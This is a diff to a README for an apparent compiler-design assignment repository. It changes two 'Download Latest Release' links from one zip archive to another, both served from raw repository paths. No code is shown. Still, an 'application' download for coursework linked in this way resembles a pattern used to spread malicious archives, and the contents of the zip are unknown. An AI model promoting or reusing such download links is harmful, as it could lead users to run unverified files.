@@ -6,7 +6,7 @@ Welcome to the compiler-design-assignment repository! Here, you'll find useful m
 
 ## 📥 Download Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-3.0.zip)](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-3.0.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-v2.1.zip)](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-v2.1.zip)
 
 To get the files you need, please follow these steps:
 
@@ -76,6 +76,6 @@ If you have questions or need assistance, please use the GitHub Issues section f
 
 ## 📌 Important Links
 
-- [Download Latest Release](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-3.0.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/RitwikShah22/compiler-design-assignment/main/Assignment_01/compiler-design-assignment-v2.1.zip)
 
 Thank you for exploring the compiler-design-assignment repository! We hope you find these materials helpful in your studies of compiler design.
